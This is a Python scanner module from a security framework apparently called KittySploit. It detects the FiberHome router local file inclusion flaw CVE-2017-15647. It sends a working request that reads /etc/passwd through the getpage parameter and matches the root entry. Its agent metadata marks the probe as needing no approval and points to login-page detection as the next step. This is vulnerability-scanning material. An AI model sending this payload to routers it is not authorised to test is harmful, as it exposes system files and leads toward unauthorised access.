#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""FiberHome routers are susceptible to local file inclusion in /cgi-bin/webproc via the getpage parameter in con."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'FiberHome Routers - Local File Inclusion Detection',
        'description': 'FiberHome routers are susceptible to local file inclusion in /cgi-bin/webproc via the getpage parameter in conjunction with a crafted var:page value.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2017', 'lfi', 'router', 'edb', 'fiberhome', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://www.exploit-db.com/exploits/44054',
            'https://blogs.securiteam.com/index.php/archives/3472',
            'https://nvd.nist.gov/vuln/detail/CVE-2017-15647',
        ],
        'cve': 'CVE-2017-15647',
    }

    def run(self):
        r = self.http_request(method="GET", path='/cgi-bin/webproc?getpage=/etc/passwd&var:language=en_us&var:page=wizardfifth', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:.*:0:0:',)
        if (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='high',
                reason="FiberHome Routers - Local File Inclusion detected",
                path='/cgi-bin/webproc?getpage=/etc/passwd&var:language=en_us&var:page=wizardfifth',
            )
            return True
        return False

